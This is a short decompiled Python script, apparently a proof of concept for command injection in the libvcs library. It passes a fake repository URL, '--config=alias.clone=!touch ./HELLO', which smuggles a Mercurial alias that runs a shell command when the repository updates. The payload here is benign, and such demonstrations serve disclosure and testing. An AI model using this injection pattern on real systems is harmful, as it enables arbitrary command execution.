# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 439_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 189 bytes
from libvcs.shortcuts import create_repo
r = create_repo(url="--config=alias.clone=!touch ./HELLO", vcs="hg", repo_dir="./")
r.update_repo()

# okay decompiling 439_1.pyc
